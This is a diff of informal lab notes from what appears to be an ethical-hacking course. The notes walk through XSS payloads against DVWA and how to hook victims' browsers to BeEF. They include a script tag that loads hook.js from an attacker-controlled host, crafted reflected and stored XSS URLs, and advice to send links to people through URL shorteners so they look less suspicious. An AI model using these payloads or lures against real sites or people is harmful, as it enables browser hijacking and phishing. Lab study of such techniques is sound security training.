@@ -19,7 +19,8 @@ Username -> admin
 Password -> password
 
 Beef ->
-username and password -> beef1
+username -> beef 
+password -> beef1
 
 - Already multiple websites r installed in the metasploit which we can exploit
 
@@ -803,44 +804,47 @@ code would be like this -> <sCript>alert(String.fromCharCode(120.115.115.50))</s
 If above do not work try this -> <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 
 Step 6 -> Hooking victims to BeEF Using Reflected XSS Screenshot(480)
-Beef Framework allows us to run large no. of commands to hook browsers and to hook a browser to beef a javascript code has to be executed on that browser
-and bcz beef uses JS it's very easy for us to inject that code into XSS vulnerable web pages and that code will be executed every time a person
-runs that page
+Beef Framework allows us to run large no. of commands to hook browsers and to hook a browser to beef a javascript code has to be
+executed on that browser and bcz beef uses JS it's very easy for us to inject that code into XSS vulnerable web pages and that code
+will be executed every time a person runs that page
 - go to kali linux desktop and run beef, it will automatically start browser for u
-- on the left side u will see folder of Online browsers which contains all the browsers which are currently hooked to beef // currently their
- is no browser hooked
+- on the left side u will see folder of Online browsers which contains all the browsers which are currently hooked to beef //
+currently their is no browser hooked
  - their r no. of ways that u can use to hook people to beef but currently we will look into XSS vulnerabilities
- - we will currently use the code given to us by beef itself which much similar to alert code we were using as u can see it in the beef opened
- terminal like this -> Hook: <script src="http://<IP>:3000/hook.js"></script>, copy it and modify it with ur own IP lik this
+ - we will currently use the code given to us by beef itself which much similar to alert code we were using as u can see it in the
+ beef opened terminal like this ->
+ Hook: <script src="http://<IP>:3000/hook.js"></script>, copy it and modify it with ur own IP lik this
  <script src="http://10.0.2.15:3000/hook.js"></script>
- - go to dvwa set security to low then go to XSS reflected tab and enter the name and get the URL generated after submit click and change the
+ - go to dvwa set security to low then go to XSS reflected tab and enter the name and get the URL generated after submit click
+ and change the
  URL like this -> http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=Sadanand# change it to this ->
  http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=<script src="http://10.0.2.15:3000/hook.js"></script>#
 
- now send this URL to any person and once they execute this URL they will be hooked to Beef and then u will be able to run all the cmds that r
- allowed u to run
- use sometype of URL shortening to make the URL less suspisious
- open the new tab in mozilla and execute the URL
- now go to beef control panel in browser// u will see that in online browser the person is hooked
+Step 7 -> now send this URL to any person and once they execute this URL they will be hooked to Beef and then u will be able to run
+	  all the cmds that r allowed u to run
+	- use sometype of URL shortening to make the URL less suspisious
+ 	- open the new tab in mozilla and execute the URL
+ 	- now go to beef control panel in browser// u will see that in online browser the person is hooked
 
- Hooking victims to beef Using Stored XSS
- - in dvwa go to XSS stored give the name as beef and message as <script src="http://10.0.2.15:3000/hook.js"></script> , if it not allowing u
- to enter more characters then increase the no. of maxlength by doing the inspect element and then click on the button
- - it will not show any thing but now u can send this URL http://10.0.2.4/dvwa/vulnerabilities/xss_s# instead of suspisious one and now u have o just wait for
- people to visit that URL and one they click that URL they will be hooked to ur beef and may be gain full access to the server or the website
+ Step 8 -> Hooking victims to beef Using Stored XSS
+ - in dvwa go to XSS stored give the name as beef and message as <script src="http://10.0.2.15:3000/hook.js"></script> , if it 
+ not allowing u to enter more characters then increase the no. of maxlength by doing the inspect element and then click on the button
+ - it will not show any thing but now u can send this URL http://10.0.2.4/dvwa/vulnerabilities/xss_s# instead of suspisious one and
+ now u have o just wait for people to visit that URL and once they click that URL they will be hooked to ur beef and may be gain 
+ full access to the server or the website
  - in the windows vm open the browser and then go to url http://10.0.2.4/dvwa/vulnerabilities/xss_s# but first set the security to low
  and now u will see that the windows machine browser also gets hooked
- - if u click on the hook of the windows machine from the beef browser , u will see the detail tab page which gives u browser information
- and also got to now the platform which is necessary to at the time of creating the backdoors etc, all the data shown in the detail tab page
- comes handy when u try to gain access of the computer such as IP , URL with which it is hooked etc
+ - if u click on the hook of the windows machine from the beef browser, u will see the detail tab page which gives u browser
+ information and also got to now the platform which is necessary to at the time of creating the backdoors etc, all the data shown in
+ the detail tab page comes handy when u try to gain access of the computer such as IP, URL with which it is hooked etc.
  - on the logs tab u can see all the events happened so far
  - in the commands tab u can see the list of cmds u can run on the target computer
  - in the rider tab u r allowed to see and create http requests
  - the xssrays tab allows u to discover xss vulnerabilities on the current page
  - the ipec a beef terminal that u can use with commands and interact with beef through it
  - the network tab will give u an overview of current network so it kind of visualize of whole netwprk
- - the webrtc basically allows u to create a network of all browsers that u gained access to and try to hide urself by using peer to peer
-  network
+ - the webrtc basically allows u to create a network of all browsers that u gained access to and try to hide urself by using peer to
+ peer network
 
 - Beef Running basic cmds on victim ->
 - after the hook go to the commands tab, choose the cmd u wants to execute in categories already provided to u
